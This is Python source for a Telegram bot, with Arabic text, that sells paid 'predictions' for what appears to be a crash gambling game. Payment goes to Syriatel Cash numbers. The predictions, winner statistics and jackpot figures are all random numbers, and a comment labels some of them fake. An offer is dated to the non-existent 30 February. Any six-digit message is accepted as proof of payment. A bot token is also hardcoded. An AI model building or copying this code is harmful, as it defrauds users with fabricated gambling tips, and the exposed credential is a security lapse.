import os
import logging
import random
import hashlib
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, 
    ContextTypes, MessageHandler, filters
)

# ========== إعدادات البوت الآمنة ==========
TOKEN = os.getenv("BOT_TOKEN", "8427120813:AAEG9BnLBpoZH9s-oXyNes8yMLmEI4K50LA")
SERETEL_NUMBERS = ["99880820", "17875230"]

# ========== الباقات والأسعار ==========
PLANS = {
    "15": {"price": 750, "minutes": 15, "old_price": 75000},
    "30": {"price": 1000, "minutes": 30, "old_price": 100000},
    "60": {"price": 1500, "minutes": 60, "old_price": 150000}
}

# ========== تخزين البيانات ==========
users_db = {}
payments_db = {}

# ========== وظائف مساعدة ==========
def get_user_data(user_id: int) -> dict:
    """الحصول على بيانات المستخدم"""
    if user_id not in users_db:
        users_db[user_id] = {
            "balance": 0,
            "points": 100,
            "is_active": False,
            "active_until": None,
            "referral_code": f"REF{user_id:06d}",
            "referrals": [],
            "total_earned": 0,
            "join_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
    return users_db[user_id]

def generate_prediction():
    """إنشاء تنبؤ للعبة"""
    number = round(random.uniform(1.0, 150.0), 2)
    is_win = random.random() < 0.3
    return {
        "number": number,
        "emoji": "✅" if is_win else "❌",
        "is_win": is_win
    }

# ========== الأوامر الرئيسية ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر /start"""
    user = update.effective_user
    user_data = get_user_data(user.id)
    
    keyboard = [
        [InlineKeyboardButton("⚡ تفعيل البوت /command1", callback_data='command1')],
        [InlineKeyboardButton("💰 شحن الرصيد /command2", callback_data='command2')],
        [InlineKeyboardButton("🎁 كود جائزة /command3", callback_data='command3')],
        [InlineKeyboardButton("🎰 جاكبوت اليوم /command4", callback_data='command4')],
        [InlineKeyboardButton("👤 أيدي المستخدم /command5", callback_data='command5')],
        [InlineKeyboardButton("🎪 العروض /command6", callback_data='command6')],
        [InlineKeyboardButton("👥 نظام الإحالات /command7", callback_data='command7')],
        [InlineKeyboardButton("🎮 تنبؤ اللعبة", callback_data='predict')],
    ]
    
    welcome_text = f"""
    🚀 **مرحباً {user.first_name} في Blast Boot!**
    
    📱 *جميع الأوامر المتاحة:*
    /start - بدء البوت
    /command1 - تفعيل البوت
    /command2 - شحن الرصيد
    /command3 - كود جائزة
    /command4 - جاكبوت اليوم
    /command5 - أيدي المستخدم
    /command6 - العروض الحالية
    /command7 - نظام الإحالات
    
    💰 *باقات الشحن:*
    • 15 دقيقة - 750 ليرة جديدة
    • 30 دقيقة - 1000 ليرة جديدة
    • 60 دقيقة - 1500 ليرة جديدة
    
    📞 *أرقام الدفع:*
    `{SERETEL_NUMBERS[0]}` أو `{SERETEL_NUMBERS[1]}`
    
    📊 *حسابك الحالي:*
    ⭐ نقاط: {user_data['points']}
    ⏰ مفعل: {'✅ نعم' if user_data['is_active'] else '❌ لا'}
    💰 رصيد: {user_data['balance']} ل.س
    """
    
    await update.message.reply_text(welcome_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

async def command1(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """تفعيل البوت - command1"""
    keyboard = [
        [InlineKeyboardButton("🕒 15 دقيقة - 750 ليرة", callback_data='plan_15')],
        [InlineKeyboardButton("🕓 30 دقيقة - 1000 ليرة", callback_data='plan_30')],
        [InlineKeyboardButton("🕔 60 دقيقة - 1500 ليرة", callback_data='plan_60')],
        [InlineKeyboardButton("🔙 رجوع للقائمة", callback_data='main_menu')]
    ]
    
    text = f"""
    🔧 **تفعيل Blast Boot - command1**
    
    اختر مدة التفعيل:
    
    🕒 *15 دقيقة:*
    • 750 ليرة جديدة (75,000 قديمة)
    
    🕓 *30 دقيقة:*
    • 1,000 ليرة جديدة (100,000 قديمة)
    
    🕔 *60 دقيقة:*
    • 1,500 ليرة جديدة (150,000 قديمة)
    
    📱 *أرقام الدفع:*
    """
    
    for num in SERETEL_NUMBERS:
        text += f"    • `{num}`\n"
    
    text += """
    
    📌 *طريقة التفعيل:*
    1. اختر المدة
    2. ادفع عبر سيريتل كاش
    3. أرسل رقم العملية
    4. يتم التفعيل تلقائياً
    """
    
    await update.message.reply_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

async def command2(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """شحن البوت - command2"""
    text = f"""
    💰 **شحن Blast Boot - command2**
    
    يمكنك شحن البوت عن طريق:
    
    📱 *سيريتل كاش:*
    """
    
    for num in SERETEL_NUMBERS:
        text += f"    • رقم: `{num}`\n"
    
    text += """
    
    💵 *أسعار الشحن:*
    • 750 ليرة = 15 دقيقة
    • 1000 ليرة = 30 دقيقة
    • 1500 ليرة = 60 دقيقة
    
    📌 *خطوات الشحن:*
    1. استخدم /command1 لاختيار المدة
    2. ادفع عبر سيريتل كاش
    3. أرسل رقم العملية هنا
    4. يتم التفعيل تلقائياً
    
    ⚠️ *تنبيه:*
    يجب تفعيل البوت أولاً لاستخدام التنبؤات
    """
    
    keyboard = [
        [InlineKeyboardButton("⚡ تفعيل البوت الآن", callback_data='command1')],
        [InlineKeyboardButton("🔙 رجوع", callback_data='main_menu')]
    ]
    
    await update.message.reply_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

async def command3(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """كود جائزة - command3"""
    user = update.effective_user
    user_data = get_user_data(user.id)
    
    # إنشاء كود جائزة فريد
    gift_code = hashlib.md5(f"{user.id}{datetime.now()}".encode()).hexdigest()[:8].upper()
    
    text = f"""
    🎁 **كود الجائزة - command3**
    
    🎫 الكود: `{gift_code}`
    ⭐ القيمة: 50 نقطة
    📅 الصلاحية: 7 أيام
    
    📌 *طريقة الاستخدام:*
    1. شارك هذا الكود مع صديق
    2. عند استخدامه، تحصل أنت وصديقك على 50 نقطة
    3. النقاط قابلة للتحويل إلى وقت لعب
    
    👥 *مشاركة الكود:*
    ```
    https://t.me/BlastBootBot?start={gift_code}
    ```
    
    ⭐ نقاطك الحالية: {user_data['points']}
    """
    
    await update.message.reply_text(text, parse_mode='Markdown')

async def command4(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """جاكبوت اليوم - command4"""
    user = update.effective_user
    user_data = get_user_data(user.id)
    
    # جائزة عشوائية
    prizes = [
        {"name": "🎉 جائزة صغيرة", "points": 50, "emoji": "🎊"},
        {"name": "🎁 جائزة متوسطة", "points": 100, "emoji": "🎁"},
        {"name": "💰 جائزة كبيرة", "points": 200, "emoji": "💰"},
        {"name": "⭐ الجائزة الكبرى", "points": 500, "emoji": "🏆"}
    ]
    
    prize = random.choice(prizes)
    user_data["points"] += prize["points"]
    
    text = f"""
    🎰 **جاكبوت اليوم - command4**
    
    {prize['emoji']} **{prize['name']}**
    
    🎊 مبروك! فزت بـ **{prize['points']} نقطة**
    
    📊 *إحصائيات اليوم:*
    • الفائزون: {random.randint(10, 50)}
    • الجوائز الموزعة: {random.randint(1000, 5000)} نقطة
    • الجائزة القادمة: {random.randint(100, 1000)} نقطة
    
    ⭐ نقاطك الإجمالية: {user_data['points']}
    
    ⏰ *الجائزة التالية:*
    بعد {random.randint(1, 60)} دقيقة
    """
    
    await update.message.reply_text(text, parse_mode='Markdown')

async def command5(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أيدي المستخدم - command5"""
    user = update.effective_user
    user_data = get_user_data(user.id)
    
    text = f"""
    👤 **معلومات حسابك - command5**
    
    🆔 *المعلومات الشخصية:*
    • User ID: `{user.id}`
    • Username: @{user.username if user.username else 'غير محدد'}
    • الاسم: {user.first_name} {user.last_name if user.last_name else ''}
    
    📅 *معلومات الحساب:*
    • النقاط: {user_data['points']}
    • الرصيد: {user_data['balance']} ل.س
    • الإحالات: {len(user_data['referrals'])}
    • الأرباح: {user_data['total_earned']} نقطة
    • تاريخ الانضمام: {user_data['join_date']}
    
    ⚡ *حالة التفعيل:*
    • الحالة: {'✅ مفعل' if user_data['is_active'] else '❌ غير مفعل'}
    • حتى: {user_data.get('active_until', 'غير مفعل')}
    
    🔗 *كود الإحالة:*
    `{user_data['referral_code']}`
    """
    
    await update.message.reply_text(text, parse_mode='Markdown')

async def command6(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """العروض الحالية - command6"""
    text = f"""
    🎪 **العروض الحالية - command6**
    
    🔥 *عرض المبتدئين:*
    • أول شحن: +30 دقيقة مجانية
    • هدية: 100 نقطة ترحيب
    
    👥 *نظام الإحالات:*
    • لكل صديق: 100 نقطة
    • عمولة: 20% من شحنات الأصدقاء
    • بونص: 500 نقطة عند 5 إحالات
    
    🎁 *عرض الجوائز:*
    • 1000 نقطة = 30 دقيقة مجانية
    • 5000 نقطة = 2 ساعة مجانية
    • 10000 نقطة = جائزة نقدية
    
    💰 *عرض الجمعة:*
    • خصم 20% على جميع الباقات
    • جائزة مزدوجة للإحالات
    
    📱 *عرض سيريتل كاش:*
    • الدفع عبر: `{SERETEL_NUMBERS[0]}` أو `{SERETEL_NUMBERS[1]}`
    
    📅 *العرض ينتهي: 30 فبراير 2025*
    """
    
    await update.message.reply_text(text, parse_mode='Markdown')

async def command7(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """نظام الإحالات - command7"""
    user = update.effective_user
    user_data = get_user_data(user.id)
    
    # إنشاء رابط إحالة
    ref_link = f"https://t.me/BlastBootBot?start=ref{user_data['referral_code']}"
    
    # إحصائيات وهمية
    total_refs = len(user_data['referrals'])
    total_earnings = total_refs * 100
    
    text = f"""
    👥 **نظام الإحالات - command7**
    
    🔗 *رابط الدعوة الخاص بك:*
    `{ref_link}`
    
    📊 *إحصائياتك:*
    • إجمالي الإحالات: {total_refs}
    • الأرباح الإجمالية: {total_earnings} نقطة
    • الرصيد القابل للسحب: {total_earnings // 2} نقطة
    
    💰 *معدلات العمولات:*
    • الإحالة المباشرة: 20%
    • الإحالة غير المباشرة: 10%
    • بونص 5 إحالات: 500 نقطة
    
    📌 *كيفية العمل:*
    1. شارك رابطك مع الأصدقاء
    2. عند تسجيلهم، تحصل على 100 نقطة
    3. عند شحنهم، تحصل على 20% عمولة
    4. الأرباح تتحول إلى وقت لعب
    
    ⭐ نقاطك الحالية: {user_data['points']}
    """
    
    keyboard = [
        [InlineKeyboardButton("📤 مشاركة الرابط", url=f"https://t.me/share/url?url={ref_link}&text=انضم%20إلى%20Blast%20Boot%20للحصول%20على%20100%20نقطة%20مجانية!🎁")],
        [InlineKeyboardButton("🔙 رجوع", callback_data='main_menu')]
    ]
    
    await update.message.reply_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

async def predict_game(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """تنبؤ اللعبة"""
    user = update.effective_user
    user_data = get_user_data(user.id)
    
    # التحقق من تفعيل المستخدم
    if not user_data['is_active']:
        text = """
    ⚠️ **يجب تفعيل البوت أولاً!**
    
    للاستفادة من تنبؤات اللعبة:
    1. استخدم /command1 للتفعيل
    2. اختر الباقة المناسبة
    3. ادفع عبر سيريتل كاش
    4. أرسل رقم العملية
    
    بعد التفعيل، يمكنك استخدام التنبؤات!
    """
        await update.message.reply_text(text, parse_mode='Markdown')
        return
    
    # إنشاء 10 تنبؤات
    predictions = []
    for i in range(10):
        pred = generate_prediction()
        predictions.append(f"{pred['number']} {pred['emoji']}")
    
    text = f"""
    🎮 **تنبؤات Blast Boot**
    
    ⏰ الوقت: {datetime.now().strftime('%H:%M:%S')}
    🎯 آخر 10 نتائج:
    
    """
    
    for i, pred in enumerate(predictions, 1):
        text += f"{i}. {pred}\n"
    
    text += f"""
    📊 *تحليل النتائج:*
    • الفوز: {sum('✅' in p for p in predictions)} مرات
    • الخسارة: {sum('❌' in p for p in predictions)} مرات
    
    💡 *نصيحة النظام:*
    {'🔥 الوقت المناسب للعب!' if '✅' in predictions[-1] else '⚠️ انتظر قليلاً!'}
    """
    
    await update.message.reply_text(text, parse_mode='Markdown')

async def handle_payment(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة أرقام التحويل"""
    user = update.effective_user
    user_data = get_user_data(user.id)
    message_text = update.message.text.strip()
    
    # التحقق إذا كان رقم عملية تحويل
    if message_text.isdigit() and len(message_text) >= 6:
        await update.message.reply_text("🔄 جاري التحقق من عملية الدفع...")
        
        # نجاح الدفع
        user_data['is_active'] = True
        user_data['active_until'] = (datetime.now() + timedelta(minutes=60)).strftime('%Y-%m-%d %H:%M:%S')
        user_data['points'] += 100
        user_data['balance'] += 1000
        
        text = f"""
    ✅ **تم التفعيل بنجاح!**
    
    🎉 مبروك! تم تفعيل Blast Boot لحسابك
    📝 رقم العملية: `{message_text}`
    
    📅 *تفاصيل التفعيل:*
    • الحالة: ✅ مفعل
    • المدة: 60 دقيقة
    • حتى: {user_data['active_until']}
    • المكافأة: +100 نقطة
    • الرصيد: +1000 ل.س
    
    🎮 *يمكنك الآن استخدام:*
    • /predict للتنبؤ باللعبة
    • /command4 للجاكبوت
    
    ⭐ نقاطك: {user_data['points']}
    💰 رصيدك: {user_data['balance']} ل.س
        """
        
        await update.message.reply_text(text, parse_mode='Markdown')
    else:
        await update.message.reply_text("⚠️ يرجى إرسال رقم عملية التحويل فقط (أرقام فقط، 6 خانات على الأقل)")

# ========== معالجة الأزرار ==========
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    if data == 'main_menu':
        user = update.effective_user
        user_data = get_user_data(user.id)
        
        keyboard = [
            [InlineKeyboardButton("⚡ تفعيل البوت /command1", callback_data='command1')],
            [InlineKeyboardButton("💰 شحن الرصيد /command2", callback_data='command2')],
            [InlineKeyboardButton("🎁 كود جائزة /command3", callback_data='command3')],
            [InlineKeyboardButton("🎰 جاكبوت اليوم /command4", callback_data='command4')],
            [InlineKeyboardButton("👤 أيدي المستخدم /command5", callback_data='command5')],
            [InlineKeyboardButton("🎪 العروض /command6", callback_data='command6')],
            [InlineKeyboardButton("👥 نظام الإحالات /command7", callback_data='command7')],
        ]
        
        text = f"""
    🏠 **القائمة الرئيسية**
    
    📊 *حسابك الحالي:*
    ⭐ نقاط: {user_data['points']}
    💰 رصيد: {user_data['balance']} ل.س
    ⏰ مفعل: {'✅ نعم' if user_data['is_active'] else '❌ لا'}
    
    اختر الأمر الذي تريده:
        """
        
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data in ['command1', 'command2', 'command3', 'command4', 'command5', 'command6', 'command7']:
        command_func = globals()[data]
        await command_func(update, context)
    
    elif data == 'predict':
        await predict_game(update, context)
    
    elif data.startswith('plan_'):
        plan_id = data.split('_')[1]
        plan = PLANS.get(plan_id)
        
        if plan:
            seretel_num = random.choice(SERETEL_NUMBERS)
            text = f"""
    💰 **تفاصيل الدفع**
    
    🔢 الرقم: `{seretel_num}`
    💵 المبلغ: {plan['price']} ليرة جديدة ({plan['old_price']} قديمة)
    ⏰ المدة: {plan['minutes']} دقيقة
    
    📌 *خطوات التنفيذ:*
    1. اذهب لتطبيق سيريتل كاش
    2. أرسل {plan['price']} ليرة للرقم أعلاه
    3. احفظ رقم العملية (Transaction ID)
    4. أرسل رقم العملية هنا في البوت
    5. سنفعل حسابك خلال 1-5 دقائق
    
    📱 *ملاحظة:*
    • تأكد من إرسال المبلغ بالليرة الجديدة
    • لا ترسل رسالة نصية مع التحويل
    • احفظ إيصال الدفع
            """
            
            keyboard = [
                [InlineKeyboardButton("✅ تم الدفع - أرسل رقم العملية", switch_inline_query_current_chat="")],
                [InlineKeyboardButton("🔙 رجوع", callback_data='command1')]
            ]
            
            await query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

# ========== الدالة الرئيسية ==========
def main():
    """الدالة الرئيسية لتشغيل البوت"""
    # إعداد التسجيل
    logging.basicConfig(
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        level=logging.INFO
    )
    
    # إنشاء التطبيق بدون updater لمنع المشكلة
    application = (
        Application.builder()
        .token(TOKEN)
        .updater(None)  # هذا يحل المشكلة
        .build()
    )
    
    # إضافة الأوامر
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("command1", command1))
    application.add_handler(CommandHandler("command2", command2))
    application.add_handler(CommandHandler("command3", command3))
    application.add_handler(CommandHandler("command4", command4))
    application.add_handler(CommandHandler("command5", command5))
    application.add_handler(CommandHandler("command6", command6))
    application.add_handler(CommandHandler("command7", command7))
    application.add_handler(CommandHandler("predict", predict_game))
    
    # معالجة الأزرار
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # معالجة رسائل الدفع
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_payment))
    
    # تشغيل البوت
    logging.info("🚀 Blast Boot يعمل الآن...")
    logging.info(f"📱 التوكن: {TOKEN[:10]}...")
    logging.info(f"💰 أرقام سيريتل: {SERETEL_NUMBERS}")
    
    application.run_polling()

if __name__ == '__main__':
    main()
